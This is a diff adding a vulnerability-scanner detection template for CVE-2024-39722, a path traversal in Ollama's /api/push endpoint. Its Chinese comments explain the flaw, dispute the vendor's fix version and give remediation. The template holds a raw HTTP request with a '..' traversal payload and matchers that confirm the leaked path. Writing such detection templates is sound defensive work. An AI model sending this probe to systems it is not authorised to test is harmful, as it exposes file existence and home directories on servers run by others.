@@ -1,0 +1,63 @@
+id: ollama-push-path-traversal
+
+info:
+  name: Ollama /api/push Path Traversal File Existence Oracle (CVE-2024-39722)
+  author: anchorscan
+  severity: medium
+  description: >
+    Ollama <=0.1.45 的 POST /api/push 对 name 字段未做路径过滤：
+    ParseModelPath 保留 ".." 段，GetManifestPath 用 filepath.Join 清洗后，
+    将清洗结果的绝对路径回显在 stat 错误消息中，构成文件存在性预言机
+    （目标不存在时返回 "stat /root/.ollama/models/manifests/...: no such
+    file or directory"，存在时错误形态变为 couldn't open file），同时泄露
+    服务运行用户的 home 目录。仅泄露文件存在性，不含文件内容读取。
+    本模板探测 payload 的 registry 段固定为不可解析域名 invalid.invalid
+    （3 段 name 形式，杜绝向真实 registry 出网），以回显路径中 ".." 已被
+    清洗（library 段消失）为命中判据。
+    修复状态存疑：厂商声称 0.1.46 已修复，但 v0.1.45 与 v0.1.46 的
+    server/modelpath.go 中 ParseModelPath 完全一致、均无 ".." 过滤。
+    0.3.14 实测（lab 负例）：registry/namespace 级 ".." 被校验拒绝
+    （{"error":"invalid model path"}）；model 段单级 ".." 虽仍被清洗
+    回显（错误动词由 stat 变为 open，残留 home 路径泄露），但清洗范围
+    被限制在 manifests 目录内部、无必然存在文件可供差分——存在性
+    预言机不可达，本模板不命中。负例验证使用 >=0.3.14。
+  reference:
+    - https://osv.dev/vulnerability/CVE-2024-39722
+    - https://www.oligo.security/blog/more-models-more-probllms
+  remediation: >
+    升级 Ollama 至 0.3.14 或更高版本（0.1.46 修复状态存疑，建议直接升级
+    到带 ParseName 校验的版本）；Ollama API 端口（默认 11434）不应暴露给
+    不可信网络。
+  classification:
+    cve-id: CVE-2024-39722
+    cwe-id: CWE-22
+  metadata:
+    verified: true
+    max-request: 1
+  tags: anchorscan,cve,cve2024,ollama,llm,traversal
+
+http:
+  - raw:
+      - |
+        POST /api/push HTTP/1.1
+        Host: {{BaseURL}}
+        Content-Type: application/json
+
+        {"name":"invalid.invalid/library/..:latest","insecure":true,"stream":false}
+
+    matchers-condition: and
+    matchers:
+      # 不存在侧：随机不存在路径 -> stat ENOENT + 绝对路径回显
+      - type: word
+        part: body
+        words:
+          - "no such file or directory"
+
+      # ".." 已被 filepath.Join 清洗的证据：回显路径中 library 段消失，
+      # manifests/invalid.invalid 直接衔接 tag（latest），且路径为绝对路径
+      # （/root/... home 目录泄露）。修复版（>=0.3.14）返回 invalid model
+      # name 且不回显输入，不满足本判据。
+      - type: regex
+        part: body
+        regex:
+          - 'stat [^" ]+/manifests/invalid\.invalid/latest'
